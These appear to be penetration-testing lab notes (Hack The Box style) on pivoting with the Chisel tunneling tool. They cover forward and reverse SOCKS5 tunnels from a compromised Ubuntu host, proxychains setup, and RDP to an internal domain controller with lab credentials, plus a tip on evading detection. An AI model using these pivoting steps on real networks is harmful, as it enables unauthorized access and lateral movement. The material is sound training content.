[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)

Chisel is a TCP/UDP-based tunneling tool written in [Go](https://go.dev/) that uses HTTP to transport data that is secured using SSH. `Chisel` can create a client-server tunnel connection in a firewall restricted environment.

Let’s say we have to tunnel our traffic to a webserver on the `172.16.5.0`/`23` network (internal network), and we have access to a DC with the address `172.16.5.19`.

This is not directly accessible to our attack host since our attack host and the domain controller belong to different network segments.

However, since we have compromised the Ubuntu server, we can start a Chisel server on it that will listen on a specific port and forward our traffic to the internal network through the established tunnel.

!!! It can be helpful to be mindful of the size of the files we transfer onto targets on our client's networks, not just for performance reasons but also considering detection !!!

### Download Chisel

```bash
Bailly@htb[/htb]$ git clone <https://github.com/jpillora/chisel.git>
```

We’ll need the programming language `Go` to build the Chisel binary :

```bash
Bailly@htb[/htb]$ cd chisel
go build
```

We can use `SCP` to transfer it to the target pivot host.

Then we can start the `Chisel server / listener` on our `pivot Ubuntu host` :

### Start Chisel Server On Pivot Host

```bash
ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5

2022/05/05 18:16:25 server: Fingerprint Viry7WRyvJIOPveDzSI2piuIvtu9QehWw9TzA3zspac=
2022/05/05 18:16:25 server: Listening on <http://0.0.0.0:1234>
```

The Chisel listener will listen for incoming connections on port `1234` using SOCKS5 (`--socks5`) and forward it to all the networks that are accessible from the pivot host.

In our case, the `pivot host` has an interface on the `172.16.5.0/23 network`, which will allow us to reach hosts on that network.

We’ll then start the `Chisel Client on our attack host` :

### Start Chisel Client And Connect To Chisel Server

```bash
Bailly@htb[/htb]$ ./chisel client -v 10.129.202.64:1234 socks

2022/05/05 14:21:18 client: Connecting to ws://10.129.202.64:1234
2022/05/05 14:21:18 client: tun: proxy#127.0.0.1:1080=>socks: Listening
2022/05/05 14:21:18 client: tun: Bound proxies
2022/05/05 14:21:19 client: Handshaking...
2022/05/05 14:21:19 client: Sending config
2022/05/05 14:21:19 client: Connected (Latency 120.170822ms)
2022/05/05 14:21:19 client: tun: SSH connected
```

The Chisel client has created a TCP/UDP tunnel via HTTP secured using SSH between the Chisel server and the client and has started listening on port 1080.

- Now we can modify our proxychains.conf file located at `/etc/proxychains.conf` and add `1080` port at the end so we can use proxychains to pivot using the created tunnel between the 1080 port and the SSH tunnel.

### Editing proxychains.conf

```bash
Bailly@htb[/htb]$ tail -4 /etc/proxychains.conf 
# meanwile
# defaults set to "tor"
# socks4 	127.0.0.1 9050
socks5 127.0.0.1 1080
```

Now we can connect to `RDP to the internal host` using `proxychains` command :

```bash
Bailly@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

# Chisel Reverse Pivot

`In the previous example, we used the compromised machine (Ubuntu) as our Chisel server, listing on port 1234`

Still, there may be scenarios where `firewall rules` restrict inbound connections to our compromised target. In such cases, we can use Chisel with the reverse option, to make outbound connections.

When the Chisel server has `--reverse` enabled, remotes can be prefixed with `R` to denote reversed.

The server will listen and accept connections, and they will be proxied through the client, which specified the remote. Reverse remotes specifying `R:socks` will listen on the server's default socks port (1080) and terminate the connection at the client's internal SOCKS5 proxy.

### **Starting the Chisel Server on our Attack Host**

```bash
Bailly@htb[/htb]$ sudo ./chisel server --reverse -v -p 1234 --socks5

2022/05/30 10:19:16 server: Reverse tunnelling enabled
2022/05/30 10:19:16 server: Fingerprint n6UFN6zV4F+MLB8WV3x25557w/gHqMRggEnn15q9xIk=
2022/05/30 10:19:16 server: Listening on <http://0.0.0.0:1234>
```

Then we connect from the Ubuntu (pivot host) to our attack host, using the option `R:socks`

### **Connecting the Chisel Client to our Attack Host From Pivot Host**

```bash
ubuntu@WEB01$ ./chisel client -v 10.10.14.17:1234 R:socks

2022/05/30 14:19:29 client: Connecting to ws://10.10.14.17:1234
2022/05/30 14:19:29 client: Handshaking...
2022/05/30 14:19:30 client: Sending config
2022/05/30 14:19:30 client: Connected (Latency 117.204196ms)
2022/05/30 14:19:30 client: tun: SSH connected
```

We can use any editor we would like to edit the proxychains.conf file, then confirm our configuration changes using `tail`.

```bash

Bailly@htb[/htb]$ tail -f /etc/proxychains.conf 

[ProxyList]
# add proxy here ...
# socks4    127.0.0.1 9050
socks5 127.0.0.1 1080 
```

If we use `proxychains` with `RDP`, we can connect to the `DC on the internal network` through the tunnel we have created to the Pivot host.

```bash
Bailly@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```